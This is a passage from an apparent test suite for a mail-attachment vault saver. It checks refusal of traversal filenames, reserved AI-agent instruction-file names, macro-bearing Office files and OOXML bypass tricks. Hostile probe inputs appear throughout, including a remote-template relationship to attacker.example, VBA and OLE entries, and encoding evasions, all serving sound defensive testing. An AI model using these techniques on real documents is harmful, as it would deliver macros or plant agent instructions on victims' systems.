import { test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { parseConfig, type Config } from "../core/config.js";
import { GuardError } from "../core/guards.js";
import { CHECKED_EXTENSIONS, MAX_TOTAL_INFLATED, contentMatches, zipEntryNames } from "../core/content.js";
import { zip, goodDocx, rels, CONTENT_TYPES, REL_DOC, type ZipEntry as ZipEntryT } from "./zipFixture.js";
import { sanitizeFilename, resolveDestination, saveFile, SAVEABLE_EXTENSIONS, RESERVED_NAMES } from "../core/vault.js";

const PDF = Buffer.from("%PDF-1.7 hello");
const HOME = "Documents/Personal/Home";

test("AGENTS.override.md is reserved", async () => {
  assert.ok(RESERVED_NAMES.has("agents.override.md"));
  for (const n of ["AGENTS.override.md", "agents.OVERRIDE.md"]) {
    assert.equal(await code(saveFile(cfg, HOME, n, Buffer.from("x"))), "NAME_NOT_ALLOWED", n);
  }
});

test("sanitizeFilename strips traversal", () => {
  assert.equal(sanitizeFilename("../../x.pdf", ".pdf"), "x.pdf");
  const b = sanitizeFilename("..\\x.pdf", ".pdf");
  assert.ok(!b.includes("\\") && !b.includes(".."));
});

test("sanitizeFilename keeps case, fallback, unicode, dots, length", () => {
  assert.equal(sanitizeFilename("Report.PDF", ".pdf"), "Report.PDF");
  assert.equal(sanitizeFilename(undefined, ".pdf"), "attachment.pdf");
  assert.equal(sanitizeFilename("résumé 2026.pdf", ".pdf"), "résumé 2026.pdf");
  assert.equal(sanitizeFilename("résumé.pdf", ".pdf"), "résumé.pdf");
  const long = sanitizeFilename("a".repeat(300) + ".pdf", ".pdf");
  assert.ok(long.length <= 120 && long.endsWith(".pdf"));
  assert.equal(sanitizeFilename(".hidden.pdf", ".pdf"), "hidden.pdf");
  assert.equal(sanitizeFilename("noext", ".pdf"), "noext.pdf");
});

let tmp: string;
let cfg: Config;
let outside: string;
beforeEach(async () => {
  tmp = await fs.mkdtemp(path.join(os.tmpdir(), "vault-"));
  const root = path.join(tmp, "vault");
  outside = path.join(tmp, "outside");
  await fs.mkdir(path.join(root, HOME), { recursive: true });
  await fs.mkdir(path.join(root, "Templates"));
  await fs.mkdir(path.join(root, ".obsidian"));
  await fs.mkdir(outside);
  await fs.symlink(outside, path.join(root, "Documents/link"));
  cfg = parseConfig({
    bridge: { host: "127.0.0.1", port: 1143, username: "user@example.com" },
    mail: { allowedMailboxes: ["Labels/MCP"] },
    vault: { root, allowedDestinations: ["Documents", "Archive"] },
  });
});
afterEach(() => fs.rm(tmp, { recursive: true, force: true }));

const OFFICE = /\.(docx|xlsx|pptx)$/i;
/** The test config, with Office documents enabled for Office names and Markdown for .md names. */
const cfgFor = (name: string): Config =>
  OFFICE.test(name) ? { ...cfg, allowOfficeDocuments: true } : /\.md$/i.test(name) ? { ...cfg, allowMarkdown: true } : cfg;

async function code(p: Promise<unknown>): Promise<string> {
  try {
    await p;
  } catch (e) {
    return e instanceof GuardError ? e.code : `other:${e}`;
  }
  return "none";
}

test("extension list", () => {
  assert.ok(SAVEABLE_EXTENSIONS.includes(".pdf"));
  assert.ok(!SAVEABLE_EXTENSIONS.includes(".exe"));
});

test("saves and returns relative path", async () => {
  const rel = await saveFile(cfg, HOME, "x.pdf", PDF);
  assert.equal(rel, `${HOME}/x.pdf`);
  assert.deepEqual(await fs.readFile(path.join(cfg.vault.root, rel)), PDF);
});

test("never overwrites", async () => {
  await saveFile(cfg, HOME, "x.pdf", PDF);
  assert.equal(await code(saveFile(cfg, HOME, "x.pdf", Buffer.from("%PDF-2"))), "EXISTS");
  assert.deepEqual(await fs.readFile(path.join(cfg.vault.root, HOME, "x.pdf")), PDF);
});

test("refuses when iCloud stub exists", async () => {
  await fs.writeFile(path.join(cfg.vault.root, HOME, ".x.pdf.icloud"), "");
  assert.equal(await code(saveFile(cfg, HOME, "x.pdf", PDF)), "EXISTS");
});

test("refuses an existing dangling symlink at the target", async () => {
  await fs.symlink(path.join(outside, "nope.pdf"), path.join(cfg.vault.root, HOME, "x.pdf"));
  assert.equal(await code(saveFile(cfg, HOME, "x.pdf", PDF)), "EXISTS");
  await assert.rejects(fs.access(path.join(outside, "nope.pdf")));
});

for (const d of ["Templates", ".obsidian", "Documents/../.claude", "/etc", "templates", "Documents/../Templates", "", "Documents\\..\\Templates", "Documents/Templates/.."]) {
  test(`rejects destination ${JSON.stringify(d)}`, async () => {
    assert.equal(await code(resolveDestination(cfg, d)), "DEST_NOT_ALLOWED");
  });
}

test("rejects missing destination without creating it", async () => {
  assert.equal(await code(saveFile(cfg, "Documents/Missing", "x.pdf", PDF)), "DEST_MISSING");
  await assert.rejects(fs.access(path.join(cfg.vault.root, "Documents/Missing")));
});

test("rejects symlink escape", async () => {
  assert.equal(await code(saveFile(cfg, "Documents/link", "x.pdf", PDF)), "DEST_NOT_ALLOWED");
  assert.deepEqual(await fs.readdir(outside), []);
});

test("rejects a file as destination", async () => {
  await fs.writeFile(path.join(cfg.vault.root, "Documents/f"), "");
  assert.equal(await code(resolveDestination(cfg, "Documents/f")), "DEST_NOT_ALLOWED");
});

for (const n of ["x.exe", "x.html", "x.zip"]) {
  test(`rejects type ${n}`, async () => {
    assert.equal(await code(saveFile(cfg, HOME, n, PDF)), "TYPE_NOT_ALLOWED");
  });
}

test("rejects pdf with bad magic", async () => {
  assert.equal(await code(saveFile(cfg, HOME, "x.pdf", Buffer.from("MZ not pdf"))), "TYPE_NOT_ALLOWED");
});

test("rejects too large", async () => {
  const small = { ...cfg, maxAttachmentBytes: 10 };
  assert.equal(await code(saveFile(small, HOME, "x.txt", Buffer.alloc(11))), "TOO_LARGE");
});

test("leading dot/space combos never produce a dot-file", async () => {
  for (const n of [". .x.pdf", ". . .x.pdf"]) {
    assert.ok(!sanitizeFilename(n, ".pdf").startsWith("."));
    await fs.rm(path.join(cfg.vault.root, "Documents/x.pdf"), { force: true });
    const rel = await saveFile(cfg, "Documents", n, PDF);
    assert.equal(rel, "Documents/x.pdf");
  }
  assert.ok(!sanitizeFilename(". .pdf", ".pdf").startsWith("."));
});

test("in-subtree symlinks to dot or Templates dirs are refused", async () => {
  const r = cfg.vault.root;
  await fs.mkdir(path.join(r, "Archive/.secret"), { recursive: true });
  await fs.mkdir(path.join(r, "Archive/Templates"), { recursive: true });
  await fs.symlink(path.join(r, "Archive/.secret"), path.join(r, "Documents/s"));
  await fs.symlink(path.join(r, "Archive/Templates"), path.join(r, "Documents/t"));
  assert.equal(await code(saveFile(cfg, "Documents/s", "x.pdf", PDF)), "DEST_NOT_ALLOWED");
  assert.equal(await code(saveFile(cfg, "Documents/t", "x.pdf", PDF)), "DEST_NOT_ALLOWED");
  assert.deepEqual(await fs.readdir(path.join(r, "Archive/.secret")), []);
});

async function walk(d: string): Promise<string[]> {
  const out: string[] = [];
  for (const e of await fs.readdir(d, { withFileTypes: true })) {
    const p = path.join(d, e.name);
    if (e.isDirectory()) out.push(...(await walk(p)));
    else out.push(p);
  }
  return out;
}

test("hostile filenames land only in the chosen folder", async () => {
  for (const n of ["../../x.pdf", "..\\y.pdf"]) {
    const rel = await saveFile(cfg, HOME, n, PDF);
    assert.equal(rel, `${HOME}/${n.endsWith("x.pdf") ? "x.pdf" : "y.pdf"}`);
  }
  const files = (await walk(tmp)).map((f) => path.relative(tmp, f)).filter((f) => f !== "vault/Documents/link").sort();
  assert.deepEqual(files, [`vault/${HOME}/x.pdf`, `vault/${HOME}/y.pdf`]);
});

test("refuses instruction-file names (case-insensitive, NFKC) and creates nothing", async () => {
  for (const n of ["CLAUDE.md", "CLAUDE.local.md", "AGENTS.md", "GEMINI.md", "claude.MD", "ＣＬＡＵＤＥ.md"]) {
    assert.equal(await code(saveFile(cfg, HOME, n, Buffer.from("x"))), "NAME_NOT_ALLOWED", n);
  }
  assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
});

test("other .md names are still saveable", async () => {
  assert.equal(await saveFile({ ...cfg, allowMarkdown: true }, HOME, "notes.md", Buffer.from("x")), `${HOME}/notes.md`);
});

test("sanitizeFilename strips invisible characters and applies NFKC", () => {
  assert.equal(sanitizeFilename("CLAUDE\u200B.md", ".txt"), "CLAUDE.md");
  assert.equal(sanitizeFilename("re\u{E0041}port\uFE0F.pdf", ".pdf"), "report.pdf");
  assert.equal(sanitizeFilename("\uFF41\uFF42.pdf", ".pdf"), "ab.pdf");
});

test("a zero-width space cannot sneak a reserved name past the check", async () => {
  assert.equal(await code(saveFile(cfg, HOME, "CLAUDE\u200B.md", Buffer.from("x"))), "NAME_NOT_ALLOWED");
  assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
});

test("refuses newer instruction-file names", async () => {
  for (const n of ["AGENT.md", "copilot-instructions.md", "CONVENTIONS.md", "agent.MD", "Copilot-Instructions.md"]) {
    assert.equal(await code(saveFile(cfg, HOME, n, Buffer.from("x"))), "NAME_NOT_ALLOWED", n);
  }
  // Sanitizing drops the leading dot; the name is still recognised and refused.
  for (const n of [".cursorrules", ".windsurfrules", "..cursorrules"]) {
    assert.equal(await code(saveFile(cfg, HOME, n, Buffer.from("x"))), "NAME_NOT_ALLOWED", n);
  }
  assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
});

test("reserved-name list is explicit about dot-named instruction files", () => {
  for (const n of ["claude.md", "claude.local.md", "agents.md", "agent.md", "gemini.md", "copilot-instructions.md", ".cursorrules", ".windsurfrules", "conventions.md"]) {
    assert.ok(RESERVED_NAMES.has(n), n);
  }
});

const heic = (brand: string) => Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from("ftyp" + brand, "latin1"), Buffer.alloc(12)]);
const DOCX = zip(["[Content_Types].xml", "word/document.xml"]);
const REAL_DOCX = goodDocx();

const GOOD: [string, Buffer][] = [
  ["a.png", Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0])],
  ["a.jpg", Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0])],
  ["a.jpeg", Buffer.from([0xff, 0xd8, 0xff, 0xdb, 0])],
  ["a.gif", Buffer.from("GIF89a....", "latin1")],
  ["b.gif", Buffer.from("GIF87a....", "latin1")],
  ["a.heic", heic("heic")],
  ["b.heic", heic("heix")],
  ["c.heic", heic("mif1")],
  ["d.heic", heic("msf1")],
  ["a.docx", DOCX],
  ["real.docx", REAL_DOCX],
  ["a.xlsx", zip(["[Content_Types].xml", "xl/workbook.xml"])],
  ["a.pptx", zip(["[Content_Types].xml", "ppt/presentation.xml"])],
  ["a.txt", Buffer.from("h\u00E9llo\nworld", "utf8")],
  ["a.csv", Buffer.from("a,b\n1,2\n")],
  ["a.md", Buffer.from("# Title\n")],
];

for (const [n, data] of GOOD) {
  test(`content check accepts a real ${n}`, async () => {
    assert.equal(await saveFile(cfgFor(n), HOME, n, data), `${HOME}/${n}`);
  });
}

const BAD: [string, Buffer][] = [
  ["x.png", PDF],
  ["x.jpg", Buffer.from([0xff, 0xd8, 0x00])],
  ["x.gif", Buffer.from("GIF88a....", "latin1")],
  ["x.heic", heic("avif")],
  ["y.heic", Buffer.from("not an image at all")],
  ["x.docx", PDF],
  ["y.docx", zip(["[Content_Types].xml", "word/document.xml", "word/vbaProject.bin"])],
  ["x.xlsx", zip(["[Content_Types].xml", "xl/VBAPROJECT.BIN"])],
  ["x.pptx", Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0])],
  ["x.txt", Buffer.from([0x61, 0xff, 0xfe, 0x62])],
  ["y.txt", Buffer.from("a\0b")],
  ["x.csv", Buffer.from([0xc3, 0x28])],
  ["x.md", Buffer.from("# hi\0")],
  ["e.png", Buffer.alloc(0)],
];

for (const [n, data] of BAD) {
  test(`content check refuses mismatched ${n} and writes nothing`, async () => {
    assert.equal(await code(saveFile(cfgFor(n), HOME, n, data)), "TYPE_NOT_ALLOWED");
    assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
  });
}

test("macro-capable legacy Office types are refused", async () => {
  for (const ext of [".doc", ".xls", ".ppt", ".DOC", ".docm", ".xlsm"]) {
    assert.ok(!SAVEABLE_EXTENSIONS.includes(ext.toLowerCase()), ext);
    assert.equal(await code(saveFile(cfg, HOME, `old${ext}`, Buffer.from([0xd0, 0xcf, 0x11, 0xe0]))), "TYPE_NOT_ALLOWED", ext);
  }
});

test("every saveable extension has a content check", () => {
  for (const ext of SAVEABLE_EXTENSIONS) assert.ok(CHECKED_EXTENSIONS.includes(ext), ext);
});

test("zipEntryNames reads the central directory and rejects truncated zips", () => {
  assert.deepEqual(zipEntryNames(DOCX), ["[Content_Types].xml", "word/document.xml"]);
  assert.equal(zipEntryNames(DOCX.subarray(0, DOCX.length - 5)), undefined);
  assert.equal(zipEntryNames(Buffer.alloc(10)), undefined);
});

const REL = (type: string, target: string, external = false) =>
  `<Relationship Id="rX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}"${external ? ' TargetMode="External"' : ""}/>`;
const docxWithDocRels = (...r: string[]) =>
  zip([
    { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
    { name: "_rels/.rels", data: rels(REL_DOC), deflate: true },
    { name: "word/document.xml", data: "<w:document/>", deflate: true },
    { name: "word/evil.bin", data: Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) },
    { name: "word/_rels/document.xml.rels", data: rels(...r), deflate: true },
  ]);

const OOXML_PROBES: [string, Buffer][] = [
  ["renamed VBA part referenced by a vbaProject relationship (deflated .rels)",
    zip([
      { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
      { name: "word/evil.bin", data: "x" },
      { name: "word/_rels/document.xml.rels", data: rels('<Relationship Id="r" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="evil.bin"/>'), deflate: true },
    ])],
  ["remote template injection (attachedTemplate, External .dotm)", docxWithDocRels(REL("attachedTemplate", "https://attacker.example/t.dotm", true))],
  ["attachedTemplate even when local", docxWithDocRels(REL("attachedTemplate", "t.dotm"))],
  ["oleObject relationship", docxWithDocRels(REL("oleObject", "embeddings/x.bin"))],
  ["activeX relationship", docxWithDocRels(REL("control", "activeX/activeX1.xml").replace("control", "activeXControl"))],
  ["externalLink relationship", docxWithDocRels(REL("externalLink", "externalLinks/externalLink1.xml"))],
  ["any TargetMode=External (hyperlink)", docxWithDocRels(REL("hyperlink", "https://example.com/", true))],
  ["entity-encoded TargetMode External", docxWithDocRels('<Relationship Id="h" Type="http://x/hyperlink" Target="https://e/" TargetMode="&#69;xternal"/>')],
  ["oleObject1.bin entry", goodDocx([{ name: "word/oleObject1.bin", data: "x" }])],
  ["embeddings/ entry", goodDocx([{ name: "word/embeddings/Microsoft_Excel_Worksheet.xlsx", data: "x" }])],
  ["activeX/ entry", goodDocx([{ name: "word/activeX/activeX1.xml", data: "<x/>" }])],
  ["activeX1.bin entry", goodDocx([{ name: "word/activeX1.bin", data: "x" }])],
  ["vbaProject.bin entry (stored)", goodDocx([{ name: "word/vbaProject.bin", data: "x" }])],
  ["macroEnabled content type (a .docm renamed .docx)",
    zip([
      { name: "[Content_Types].xml", data: CONTENT_TYPES.replace("document.main+xml", "document.macroEnabled.main+xml"), deflate: true },
      { name: "word/document.xml", data: "<w:document/>" },
    ])],
  ["vbaProject content type",
    zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES.replace("</Types>", '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'), deflate: true }])],
  ["zip with no [Content_Types].xml (a jar)", zip([{ name: "META-INF/MANIFEST.MF", data: "Manifest-Version: 1.0\n", deflate: true }, { name: "a/B.class", data: "x" }])],
  ["UTF-16 .rels (would hide keywords from a byte search)",
    zip([
      { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
      { name: "_rels/.rels", data: Buffer.from(rels(REL("attachedTemplate", "t.dotm")), "utf16le"), deflate: true },
    ])],
  [".rels over 1 MB uncompressed", goodDocx([{ name: "word/_rels/big.xml.rels", data: rels(" ".repeat(1024 * 1024 + 1)), deflate: true }])],
  ["more than 200 inspected entries", goodDocx(Array.from({ length: 200 }, (_, i) => ({ name: `p/_rels/${i}.xml.rels`, data: rels(), deflate: true })))],
  ["unsupported compression method on a .rels",
    (() => {
      const z = zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES }, { name: "_rels/.rels", data: rels(REL_DOC) }]);
      // Patch the central-directory method of the second entry to 12 (bzip2).
      const cd = z.lastIndexOf(Buffer.from("_rels/.rels")) - 46;
      z.writeUInt16LE(12, cd + 10);
      return z;
    })()],
];

for (const [what, data] of OOXML_PROBES) {
  test(`OOXML check refuses: ${what}`, () => {
    for (const ext of [".docx", ".xlsx", ".pptx"]) assert.equal(contentMatches(ext, data), false, ext);
  });
}

test("OOXML check accepts a realistic macro-free docx with deflated parts", async () => {
  assert.equal(contentMatches(".docx", REAL_DOCX), true);
  assert.equal(await code(saveFile(cfgFor("y.docx"), HOME, "y.docx", OOXML_PROBES[1]![1])), "TYPE_NOT_ALLOWED");
});

test("contentMatches refuses prototype keys cleanly", () => {
  for (const ext of ["constructor", "__proto__", "toString", "hasOwnProperty", ".constructor"]) {
    assert.equal(contentMatches(ext, Buffer.from("x")), false, ext);
  }
});

// --- Zip structure: local headers must match the central directory exactly ---

const RT = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/";
const docParts = (extra: ZipEntryT[] = [], docRels: string[] = []) =>
  zip([
    { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
    { name: "_rels/.rels", data: rels(REL_DOC), deflate: true },
    { name: "word/document.xml", data: "<w:document/>", deflate: true },
    { name: "word/_rels/document.xml.rels", data: rels(...docRels), deflate: true },
    ...extra,
  ]);

const STRUCTURE_PROBES: [string, Buffer][] = [
  ["local entry missing from the central directory",
    docParts([{ name: "word/hidden.xml", data: "<x/>", hidden: true }])],
  ["central name differs from local name",
    docParts([{ name: "word/vbaProject.bin", centralName: "word/media/a.png", data: "x" }])],
  ["trailing bytes after the end record", Buffer.concat([REAL_DOCX, Buffer.from("trailer")])],
  ["leading bytes before the first local header", Buffer.concat([Buffer.from("PK\x03\x04junkjunkjunkjunkjunkjunkjunk"), REAL_DOCX])],
  ["duplicate entry names", docParts([{ name: "word/document.xml", data: "<w:document/>" }])],
  ["duplicate entry names differing only in case", docParts([{ name: "WORD/Document.XML", data: "<w:document/>" }])],
  ["duplicate [Content_Types].xml", docParts([{ name: "[Content_Types].xml", data: "<Types/>" }])],
  ["raw keyword backstop: stored part mentioning ActiveX", docParts([{ name: "word/media/note.xml", data: "<x>ACTIVEX</x>" }])],
  ["raw keyword backstop: attachedTemplate in a stored part", docParts([{ name: "word/x.xml", data: "attachedTemplate" }])],
];

for (const [what, data] of STRUCTURE_PROBES) {
  test(`zip structure check refuses: ${what}`, () => {
    assert.equal(contentMatches(".docx", data), false);
  });
}

test("zip structure check accepts entries written with data descriptors", () => {
  const z = zip([
    { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true, descriptor: true },
    { name: "_rels/.rels", data: rels(REL_DOC), deflate: true, descriptor: true },
    { name: "word/document.xml", data: "<w:document/>", deflate: true, descriptor: true },
  ]);
  assert.equal(contentMatches(".docx", z), true);
});

// --- XML encoding of inspected parts ---

const withRels = (bytes: Buffer) =>
  zip([
    { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
    { name: "_rels/.rels", data: bytes, deflate: true },
  ]);
const RELS_BODY = rels(REL_DOC).replace('<?xml version="1.0" encoding="UTF-8"?>', "");

const ENCODING_PROBES: [string, Buffer][] = [
  ["declared UTF-16", Buffer.from('<?xml version="1.0" encoding="UTF-16"?>' + RELS_BODY)],
  ["declared ISO-8859-1", Buffer.from("<?xml version='1.0' encoding='ISO-8859-1'?>" + RELS_BODY)],
  ["declared UTF-7", Buffer.from('<?xml version="1.0" encoding="utf-7"?>' + RELS_BODY)],
  ["UTF-16 BE BOM", Buffer.concat([Buffer.from([0xfe, 0xff]), Buffer.from(RELS_BODY)])],
  ["UTF-16 LE BOM", Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(RELS_BODY)])],
  ["UTF-32 BE BOM", Buffer.concat([Buffer.from([0, 0, 0xfe, 0xff]), Buffer.from(RELS_BODY)])],
  ["UTF-32 LE BOM", Buffer.concat([Buffer.from([0xff, 0xfe, 0, 0]), Buffer.from(RELS_BODY)])],
  ["DOCTYPE / entity declarations", Buffer.from('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "x">]>' + RELS_BODY)],
];

for (const [what, bytes] of ENCODING_PROBES) {
  test(`XML encoding check refuses: ${what}`, () => {
    assert.equal(contentMatches(".docx", withRels(bytes)), false);
  });
}

test("XML encoding check accepts UTF-8 (declared, lower-case, undeclared, or with a UTF-8 BOM)", () => {
  for (const bytes of [
    Buffer.from('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' + RELS_BODY),
    Buffer.from("<?xml version='1.0' encoding='utf-8'?>" + RELS_BODY),
    Buffer.from('<?xml version="1.0"?>' + RELS_BODY),
    Buffer.from(RELS_BODY),
    Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(RELS_BODY)]),
  ]) {
    assert.equal(contentMatches(".docx", withRels(bytes)), true, bytes.toString("latin1").slice(0, 60));
  }
});

// --- Allowlisted relationship and content types; no nested binaries or documents ---

const rel = (type: string, target = "x.xml") => `<Relationship Id="rA" Type="${type}" Target="${target}"/>`;

for (const name of ["package", "aFChunk", "subDocument", "frame", "control", "printerSettings", "font", "video", "hyperlink", "vmlDrawing", "somethingNew"]) {
  test(`relationship allowlist refuses ${name}`, () => {
    assert.equal(contentMatches(".docx", docParts([], [rel(RT + name)])), false);
  });
}

test("relationship allowlist refuses unknown namespaces and malformed relationships", () => {
  for (const r of [
    rel("http://attacker.example/relationships/styles"),
    rel("urn:styles"),
    '<Relationship Id="rA" Target="styles.xml"/>',
    '<x:Relationship xmlns:x="http://schemas.openxmlformats.org/package/2006/relationships" Id="r" Type="' + RT + 'package" Target="a"/>',
  ]) {
    assert.equal(contentMatches(".docx", docParts([], [r])), false, r);
  }
});

const PKG_NS = "http://schemas.openxmlformats.org/package/2006/relationships";
const RELATIONSHIP_BYPASSES: [string, string][] = [
  ["non-ASCII prefix with package", `<\u00E9:Relationship xmlns:\u00E9="${PKG_NS}" Id="r" Type="${RT}package" Target="a.bin"/>`],
  ["non-ASCII prefix with aFChunk", `<\u00E9:Relationship xmlns:\u00E9="${PKG_NS}" Id="r" Type="${RT}aFChunk" Target="a.html"/>`],
  ["x:Type decoy before the real Type", `<Relationship xmlns:x="urn:x" x:Type="${RT}styles" Id="r" Type="${RT}subDocument" Target="a.docx"/>`],
  ["prefixed Type alone", `<Relationship xmlns:x="urn:x" x:Type="${RT}styles" Id="r" Target="a.xml"/>`],
  ["Type decoy inside another attribute value (single quotes)", `<Relationship x='Type="${RT}styles"' Id="r" Type="${RT}frame" Target="a.html"/>`],
  ["Type decoy inside another attribute value (entities)", `<Relationship x="&quot; Type=&quot;${RT}styles" Id="r" Type="${RT}frame" Target="a.html"/>`],
  ["duplicate Type", `<Relationship Id="r" Type="${RT}styles" Type="${RT}subDocument" Target="a.xml"/>`],
  ["uppercase Type value", `<Relationship Id="r" Type="${RT.toUpperCase()}STYLES" Target="a.xml"/>`],
  ["uppercase name in a known namespace", `<Relationship Id="r" Type="${RT}Styles" Target="a.xml"/>`],
  ["attributes that do not parse", `<Relationship Id="r" Type="${RT}styles"Target="a.xml"/>`],
  ["unquoted attribute value", `<Relationship Id=r Type="${RT}styles" Target="a.xml"/>`],
  ["upper-case element name the strict parser would skip", `<RELATIONSHIP Id="r" Type="${RT}subDocument" Target="a.xml"/>`],
  ["doubly prefixed element", `<a:b:Relationship Id="r" Type="${RT}package" Target="a.bin"/>`],
  ["TargetMode other than Internal", `<Relationship Id="r" Type="${RT}image" Target="a.png" TargetMode="&#69;xternal"/>`],
];

for (const [what, r] of RELATIONSHIP_BYPASSES) {
  test(`relationship parsing refuses: ${what}`, () => {
    assert.equal(contentMatches(".docx", docParts([], [r])), false);
  });
}

test("relationship backstop cannot be balanced by a comment with a bogus prefixed tag", () => {
  const r = `<!-- <!x:Relationship Id="a" Type="${RT}styles" Target="s.xml"/> --><a:b:Relationship Id="r" Type="${RT}package" Target="a.bin"/>`;
  assert.equal(contentMatches(".docx", docParts([], [r])), false);
  for (const bad of [
    `<a!:Relationship Id="r" Type="${RT}styles" Target="s.xml"/>`,
    `<?x:Relationship Id="r" Type="${RT}styles" Target="s.xml"/>`.replace("<?", "<1"),
    `<:Relationship Id="r" Type="${RT}styles" Target="s.xml"/>`,
  ]) {
    assert.equal(contentMatches(".docx", docParts([], [bad])), false, bad);
  }
});

// --- XML 1.0 only; no NEL, line/paragraph separators or stray control characters ---

const REL_STYLES = `<Relationship Id="r" Type="${RT}styles" Target="s.xml"/>`;
const XML_PROBES: [string, Buffer][] = [
  ["XML 1.1 declaration in a .rels", withRels(Buffer.from('<?xml version="1.1" encoding="UTF-8"?>' + RELS_BODY))],
  ["XML 1.1 declaration (single quotes) in a .rels", withRels(Buffer.from("<?xml version='1.1'?>" + RELS_BODY))],
  ["XML 1.1 declaration in [Content_Types].xml",
    zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES.replace('version="1.0"', 'version="1.1"'), deflate: true }])],
  ["NEL (U+0085) inside a tag", docParts([], [`<Relationship\u0085Id="r" Type="${RT}styles" Target="s.xml"/>`])],
  ["U+2028 between attributes", docParts([], [`<Relationship Id="r"\u2028Type="${RT}styles" Target="s.xml"/>`])],
  ["U+2029 in a .rels", docParts([], [REL_STYLES + "\u2029"])],
  ["C0 control (U+0001) in a .rels", docParts([], [REL_STYLES + "\u0001"])],
  ["DEL (U+007F) in [Content_Types].xml",
    zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES + "\u007F", deflate: true }])],
  ["C1 control (U+009B) in [Content_Types].xml",
    zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES + "\u009B", deflate: true }])],
];

for (const [what, data] of XML_PROBES) {
  test(`XML check refuses: ${what}`, () => {
    assert.equal(contentMatches(".docx", data), false);
  });
}

test("XML check still accepts tab, LF and CR line endings and version 1.0", () => {
  const r = `<Relationship\tId="r"\r\n  Type="${RT}styles"\n  Target="s.xml"/>`;
  assert.equal(contentMatches(".docx", docParts([], [r])), true);
  assert.equal(contentMatches(".docx", withRels(Buffer.from("<?xml version='1.0'?>" + RELS_BODY))), true);
});

// --- Total inflated bytes across one attachment ---

test("more than MAX_TOTAL_INFLATED across inspected parts is refused quickly", () => {
  assert.equal(MAX_TOTAL_INFLATED, 16 * 1024 * 1024);
  const filler = (i: number) => rels(REL_STYLES) + " ".repeat(1024 * 1024 - rels(REL_STYLES).length - 1 - String(i).length);
  const parts = Array.from({ length: 20 }, (_, i) => ({ name: `p/_rels/${i}.xml.rels`, data: filler(i), deflate: true }));
  const data = goodDocx(parts);
  const t = performance.now();
  assert.equal(contentMatches(".docx", data), false);
  const took = performance.now() - t;
  assert.ok(took < 500, `took ${took.toFixed(0)} ms`);
  // Just under the cap is fine.
  assert.equal(contentMatches(".docx", goodDocx(parts.slice(0, 15))), true);
});

test("an inflated part whose size differs from its declared size is refused", () => {
  const z = goodDocx();
  // Lie about the uncompressed size of _rels/.rels in both headers.
  const name = Buffer.from("_rels/.rels");
  const cd = z.lastIndexOf(name) - 46;
  const lh = z.indexOf(name) - 30;
  z.writeUInt32LE(z.readUInt32LE(cd + 24) + 1, cd + 24);
  z.writeUInt32LE(z.readUInt32LE(lh + 22) + 1, lh + 22);
  assert.equal(contentMatches(".docx", z), false);
});

// --- Entities decode in one pass ---

test("double-encoded entities are not decoded twice", () => {
  assert.equal(
    contentMatches(".docx", docParts([], [`<Relationship Id="r" Type="${RT}styles" Target="s.xml" TargetMode="&#x26;#73;nternal"/>`])),
    false,
  );
  assert.equal(
    contentMatches(".docx", docParts([], [`<Relationship Id="r" Type="&#x26;#104;ttp://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="s.xml"/>`])),
    false,
  );
  assert.equal(
    contentMatches(".docx", docParts([], [`<Relationship Id="r" Type="&amp;#104;ttp://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="s.xml"/>`])),
    false,
  );
  // A single, ordinary encoding still decodes.
  assert.equal(
    contentMatches(".docx", docParts([], [`<Relationship Id="r" Type="&#104;ttp://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="s.xml" TargetMode="&#73;nternal"/>`])),
    true,
  );
});

// --- Office body parts: Word field codes, Excel formulas, PowerPoint actions ---

const W_NS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
const wdoc = (body: string) => `${XML_DECL}<w:document ${W_NS}><w:body><w:p>${body}</w:p></w:body></w:document>`;
const wrun = (t: string) => `<w:r><w:t>${t}</w:t></w:r>`;
const instr = (t: string) => `<w:r><w:instrText xml:space="preserve">${t}</w:instrText></w:r>`;
const fldChar = (kind: string) => `<w:r><w:fldChar w:fldCharType="${kind}"/></w:r>`;
const field = (...pieces: string[]) =>
  fldChar("begin") + pieces.map(instr).join("") + fldChar("separate") + wrun("result") + fldChar("end");
const docx = (documentXml: string, extra: ZipEntryT[] = []) =>
  zip([
    { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
    { name: "_rels/.rels", data: rels(REL_DOC), deflate: true },
    { name: "word/document.xml", data: documentXml, deflate: true },
    ...extra,
  ]);

const SS = "application/vnd.openxmlformats-officedocument.spreadsheetml";
const xlsxTypes = (extra = "") =>
